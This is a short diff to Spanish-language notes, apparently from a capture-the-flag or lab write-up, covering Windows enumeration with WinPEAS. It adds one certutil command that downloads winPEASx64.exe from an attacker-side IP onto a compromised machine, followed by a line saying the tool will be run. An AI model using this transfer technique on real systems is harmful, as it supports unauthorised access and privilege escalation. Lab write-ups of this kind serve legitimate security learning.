@@ -98,5 +98,7 @@ Nos encontramos en un sistema `Windows`
 # Enumeración Windows
 Para realizar esta parte en Windows usaremos la herramienta [[WINPEAS]], nos lo pasamos a la maquina a la que hemos obtenido acceso usando
 ```shell
-
+certutil.exe -f -urlcache -split http://10.10.14.79/winPEASx64.exe
 ```
+
+Una vez en la maquina lo ejecutaremos, en la salida obtenida observamos
